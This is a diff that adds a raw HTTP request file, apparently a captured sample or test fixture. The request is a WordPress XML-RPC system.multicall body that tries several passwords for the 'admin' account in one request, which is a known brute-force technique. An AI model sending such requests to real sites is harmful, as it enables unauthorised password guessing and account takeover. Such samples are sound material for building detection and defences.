@@ -1,0 +1,8 @@
+POST /xmlrpc.php HTTP/1.1
+Host: 192.0.2.10
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)
+Content-Type: text/xml
+Content-Length: 712
+Connection: close
+
+<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>pass222</string></value></data></array></value></member></struct></value><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>secret2</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>
